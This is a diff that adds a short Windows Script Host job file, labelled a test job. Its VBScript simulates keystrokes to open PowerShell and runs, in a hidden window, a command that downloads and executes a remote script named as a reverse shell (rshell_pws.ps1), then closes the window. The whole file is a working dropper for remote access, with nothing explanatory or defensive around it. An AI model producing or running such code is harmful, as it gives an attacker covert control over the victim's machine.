@@ -1,0 +1,16 @@
+<?xml version="1.0" encoding="windows-1251"?>
+ 
+<job id="MyTestJob">
+    <script language="VBScript">
+    <![CDATA[
+	Set WshShell = WScript.CreateObject("WScript.Shell")
+	WshShell.SendKeys "%(D)powershell{ENTER}"
+	Wscript.Sleep 1000
+	WshShell.SendKeys "PowerShell.exe -WindowStyle hidden {{}iex{(}iwr{(}""https://raw.githubusercontent.com/yorkvik/files/master/rshell_pws.ps1""{)}{)}{}}"
+	WshShell.SendKeys "{ENTER}"
+	WshShell.SendKeys "{PGDN}"
+	Wscript.Sleep 1000
+	WshShell.SendKeys "exit {ENTER}"
+    ]]>
+    </script>
+</job>
